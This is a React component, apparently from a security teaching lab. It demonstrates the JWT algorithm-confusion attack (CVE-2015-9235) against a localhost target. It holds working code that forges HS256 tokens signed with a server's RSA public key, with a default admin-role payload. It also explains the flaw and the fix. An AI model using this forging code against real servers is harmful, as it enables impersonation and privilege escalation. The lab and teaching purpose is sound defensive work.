import { useState, useRef } from 'react'
import * as jose from 'jose'

/** Decode JWT header/payload */
function decodeJwt(token) {
  try {
    const [h, p] = token.split('.')
    return {
      header: JSON.parse(atob(h.replace(/-/g, '+').replace(/_/g, '/'))),
      payload: JSON.parse(atob(p.replace(/-/g, '+').replace(/_/g, '/'))),
    }
  } catch { return null }
}

/** Tạo log entry với timestamp */
function makeLog(msg, type = 'info') {
  const t = new Date().toLocaleTimeString()
  return { msg, type, t, id: Math.random() }
}

/** CopyButton */
function CopyBtn({ text, style }) {
  const [ok, setOk] = useState(false)
  return (
    <button className="copy-btn" style={style}
      onClick={() => { navigator.clipboard.writeText(text); setOk(true); setTimeout(() => setOk(false), 1400) }}>
      {ok ? 'Copied' : 'Copy'}
    </button>
  )
}

export default function JwtAttackPage() {
  // Step 1 (RSA Public Key)
  const [publicKey, setPublicKey] = useState('')
  const [step1Done, setStep1Done] = useState(false)

  // Step 2
  const [origToken, setOrigToken] = useState('')
  const [decoded, setDecoded] = useState(null)

  // Step 3 (Cấu hình Payload dưới dạng JSON & Forged Token)
  const [customPayload, setCustomPayload] = useState(JSON.stringify({
    sub: 'hacker',
    role: 'admin',
    userId: 1
  }, null, 2))
  const [forgedToken, setForgedToken] = useState('')
  const [forging, setForging] = useState(false)



  const [logs, setLogs] = useState([makeLog('Hacker Tool khởi động — CVE-2015-9235 Demo', 'info')])
  const addLog = (msg, type) => setLogs(l => [...l.slice(-99), makeLog(msg, type)])

  const logRef = useRef()

  // ── Bước 2: Decode JWT gốc ───────────────────────────────────────────────
  const handleTokenPaste = (val) => {
    setOrigToken(val)
    const dec = decodeJwt(val)
    setDecoded(dec)
    if (dec && dec.payload) {
      setCustomPayload(JSON.stringify(dec.payload, null, 2))
      addLog('Đã tự động điền payload từ token gốc vào form cấu hình JSON', 'success')
    }
  }

  // ── Bước 3: Forge HS256 token với payload JSON tùy chỉnh ─────────────────
  const forgeToken = async () => {
    if (!publicKey) { addLog('Cần nhập public key trước (Bước 1)', 'error'); return }
    setForging(true)
    addLog('[STEP 3] Forging HS256 token bằng RSA Public Key PEM...', 'warning')
    try {
      const secret = new TextEncoder().encode(publicKey)

      // Parse payload JSON
      let payloadObj
      try {
        payloadObj = JSON.parse(customPayload)
      } catch (err) {
        throw new Error(`Cấu trúc JSON không hợp lệ: ${err.message}`)
      }

      // Tự động thêm iat và exp nếu chưa định nghĩa để token hợp lệ
      if (!payloadObj.iat) payloadObj.iat = Math.floor(Date.now() / 1000)
      if (!payloadObj.exp) payloadObj.exp = Math.floor(Date.now() / 1000) + 3600

      const token = await new jose.SignJWT(payloadObj)
        .setProtectedHeader({ alg: 'HS256', typ: 'JWT' })  // ← Đổi thuật toán sang HS256
        .sign(secret)

      setForgedToken(token)
      const decoded2 = decodeJwt(token)
      addLog(`Token forged! alg=HS256 | sub=${payloadObj.sub || 'unknown'} | role=${payloadObj.role || 'none'}`, 'success')
      addLog(`   Header:  ${JSON.stringify(decoded2?.header)}`, 'warning')
      addLog(`   Payload: ${JSON.stringify(decoded2?.payload)}`, 'warning')
      addLog('✅ Token giả đã tạo xong! Tiếp tục Bước 4 để gửi đến server.', 'success')
    } catch (e) {
      addLog(`Forge error: ${e.message}`, 'error')
    } finally {
      setForging(false)
    }
  }



  return (
    <div>
      {/* Title */}
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 22, fontWeight: 800, color: '#ef4444' }}>
          JWT Algorithm Confusion Attack
        </h1>
        <p style={{ color: '#94a3b8', fontSize: 13, marginTop: 4 }}>
          CVE-2015-9235 — RS256 → HS256 với RSA Public Key làm HMAC secret
        </p>
      </div>

      <div className="grid-2">
        <div>
          {/* Bước 1 */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${step1Done ? 'done' : ''}`}>1</div>
              <div className="step-title">Nhập RSA Public Key</div>
              {step1Done && <span className="badge badge-success">Done</span>}
            </div>

            <div className="form-group">
              <label className="form-label">RSA Public Key (PEM format)</label>
              <textarea
                className="form-input"
                rows={6}
                value={publicKey}
                onChange={e => {
                  const val = e.target.value
                  setPublicKey(val)
                  setStep1Done(val.trim().length > 0)
                }}
                placeholder="Dán Public Key PEM tại đây..."
                style={{
                  resize: 'vertical',
                  fontFamily: 'monospace',
                  fontSize: 10,
                  background: '#090d16',
                  color: '#3b82f6',
                  border: '1px solid #334155'
                }}
              />
            </div>
            <p style={{ fontSize: 11, color: '#64748b', marginTop: 4 }}>
              Lấy từ: <code style={{ color: '#f59e0b' }}>GET http://localhost:4002/api/public-key</code>
              {' '}→ trường <code style={{ color: '#3b82f6' }}>publicKey</code>
            </p>
          </div>

          {/* Bước 2 */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${decoded ? 'done' : ''}`}>2</div>
              <div className="step-title">Paste JWT gốc (tùy chọn)</div>
            </div>
            <div className="form-group">
              <label className="form-label">JWT Token từ Login (Để trích xuất payload)</label>
              <textarea className="form-input" rows={3} placeholder="eyJhbGci..."
                value={origToken} onChange={e => handleTokenPaste(e.target.value)}
                style={{ resize: 'vertical', fontFamily: 'monospace', fontSize: 11 }} />
            </div>
            {decoded && (
              <div style={{ fontSize: 11, color: '#94a3b8' }}>
                <span style={{ color: '#f59e0b' }}>alg={decoded.header?.alg}</span>
                &nbsp;|&nbsp;role=<strong style={{ color: '#ef4444' }}>{decoded.payload?.role}</strong>
                &nbsp;|&nbsp;sub={decoded.payload?.sub}
              </div>
            )}
          </div>

          {/* Bước 3 */}
          <div className="card">
            <div className="step-header">
              <div className={`step-num ${forgedToken ? 'done' : ''}`}>3</div>
              <div className="step-title">Cấu hình &amp; Tạo Token Giả (Forge)</div>
              {forgedToken && <span className="badge badge-warning">Forged</span>}
            </div>

            <div className="form-group">
              <label className="form-label">Custom JWT Payload (JSON format)</label>
              <textarea
                className="form-input"
                rows={7}
                value={customPayload}
                onChange={e => setCustomPayload(e.target.value)}
                style={{
                  resize: 'vertical',
                  fontFamily: 'monospace',
                  fontSize: 11,
                  background: '#090d16',
                  border: '1px solid #334155',
                  color: '#22c55e'
                }}
              />
            </div>

            <p style={{ fontSize: 12, color: '#94a3b8', marginBottom: 12 }}>
              Token mới sẽ có <code style={{ color: '#f59e0b' }}>alg=HS256</code> và chữ ký được ký bằng HMAC-SHA256 dùng public key PEM làm secret.
            </p>
            <button className="btn btn-danger" onClick={forgeToken} disabled={!publicKey || forging}>
              {forging ? <div className="spinner" /> : 'Forge HS256 Token'}
            </button>
            {forgedToken && (
              <div className="code-box danger" style={{ marginTop: 12, fontSize: 10 }}>
                <CopyBtn text={forgedToken} />
                {forgedToken}
              </div>
            )}
          </div>


        </div>

        {/* Attack Log Panel */}
        <div>
          <div className="card" style={{ height: 'fit-content', position: 'sticky', top: 24 }}>
            <div className="card-title">
              Attack Log
              <button className="btn btn-ghost" style={{ marginLeft: 'auto', padding: '4px 10px', fontSize: 11 }}
                onClick={() => setLogs([])}>Clear</button>
            </div>
            <div className="attack-log" ref={logRef} style={{ height: '320px' }}>
              {logs.map(l => (
                <div key={l.id} className={`log-entry ${l.type}`}>
                  <span style={{ color: '#475569' }}>[{l.t}]</span> {l.msg}
                </div>
              ))}
            </div>
            <div style={{ marginTop: 14, padding: 12, background: '#060e1a', borderRadius: 7, fontSize: 12 }}>
              <div style={{ fontWeight: 700, color: '#f59e0b', marginBottom: 8 }}>Nguyên lý CVE-2015-9235</div>
              <div style={{ color: '#94a3b8', lineHeight: 1.6 }}>
                Server vulnerable dùng <code style={{ color: '#f59e0b' }}>jwt.verify(token, publicKey)</code> không có
                algorithm whitelist → khi token có alg=HS256, publicKey được dùng như HMAC secret.
                Vì publicKey là công khai, attacker có thể ký token giả với bất kỳ payload nào.
              </div>
            </div>
            <div style={{ marginTop: 10, padding: 12, background: '#060e1a', borderRadius: 7, fontSize: 12 }}>
              <div style={{ fontWeight: 700, color: '#22c55e', marginBottom: 8 }}>Cách Phòng Chống</div>
              <div style={{ color: '#94a3b8', lineHeight: 1.6 }}>
                Server secure kiểm tra <code style={{ color: '#22c55e' }}>alg</code> trong JWT header thủ công TRƯỚC
                khi verify — từ chối ngay nếu không phải RS256. Attacker không thể bypass bằng alg=HS256.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
